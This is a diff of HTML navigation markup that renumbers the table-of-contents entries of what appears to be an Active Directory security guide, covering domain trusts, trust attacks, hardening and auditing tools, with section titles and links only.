 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.18 Child-to-Parent Trust Attacks (ExtraSids)<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.15 Domain Trusts<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#extrasids-overview">1.18.1 Overview</a>
-<a href="#extrasids-windows">1.18.2 From Windows</a>
-<a href="#extrasids-linux">1.18.3 From Linux</a>
-<a href="#extrasids-defense">1.18.4 Remediation</a>
+<a href="#trust-types">1.15.1 Trust Types</a>
+<a href="#trust-enum">1.15.2 Trust Enumeration</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.19 Cross-Forest Trust Abuse<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.16 Child-to-Parent Trust Attacks (ExtraSids)<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#cross-forest-kerberoast">1.19.1 Cross-Forest Kerberoasting</a>
-<a href="#cross-forest-membership">1.19.2 Foreign Group Membership &amp; Admin Password Reuse</a>
-<a href="#cross-forest-bloodhound">1.19.3 Hunting Foreign Membership with BloodHound (Linux)</a>
-<a href="#sid-history-cross-forest">1.19.4 SID History Abuse Across Forests</a>
+<a href="#extrasids-overview">1.16.1 Overview</a>
+<a href="#extrasids-windows">1.16.2 From Windows</a>
+<a href="#extrasids-linux">1.16.3 From Linux</a>
+<a href="#extrasids-defense">1.16.4 Remediation</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.20 Hardening Active Directory<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.17 Cross-Forest Trust Abuse<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#hardening-audit">1.20.1 Document and Audit</a>
-<a href="#hardening-people">1.20.2 People</a>
-<a href="#protected-users">1.20.3 Protected Users Group</a>
-<a href="#hardening-process">1.20.4 Processes</a>
-<a href="#hardening-technology">1.20.5 Technology</a>
-<a href="#protections-by-ttp">1.20.6 Protections by TTP (MITRE ATT&amp;CK Mapping)</a>
+<a href="#cross-forest-kerberoast">1.17.1 Cross-Forest Kerberoasting</a>
+<a href="#cross-forest-membership">1.17.2 Foreign Group Membership &amp; Admin Password Reuse</a>
+<a href="#cross-forest-bloodhound">1.17.3 Hunting Foreign Membership with BloodHound (Linux)</a>
+<a href="#sid-history-cross-forest">1.17.4 SID History Abuse Across Forests</a>
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">1.21 Additional AD Auditing Techniques<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">1.18 Hardening Active Directory<i class="bi bi-caret-down-fill"></i></button>
 <div class="nested-dropdown-container">
-<a href="#ad-explorer">1.21.1 Active Directory Explorer (Sysinternals)</a>
-<a href="#pingcastle">1.21.2 PingCastle</a>
-<a href="#group3r">1.21.3 Group3r</a>
-<a href="#adrecon">1.21.4 ADRecon</a>
+<a href="#hardening-audit">1.18.1 Document and Audit</a>
+<a href="#hardening-people">1.18.2 People</a>
+<a href="#protected-users">1.18.3 Protected Users Group</a>
+<a href="#hardening-process">1.18.4 Processes</a>
+<a href="#hardening-technology">1.18.5 Technology</a>
+<a href="#protections-by-ttp">1.18.6 Protections by TTP (MITRE ATT&amp;CK Mapping)</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">1.19 Additional AD Auditing Techniques<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#ad-explorer">1.19.1 Active Directory Explorer (Sysinternals)</a>
+<a href="#pingcastle">1.19.2 PingCastle</a>
+<a href="#group3r">1.19.3 Group3r</a>
+<a href="#adrecon">1.19.4 ADRecon</a>
 </div>
 </div>
 </div>
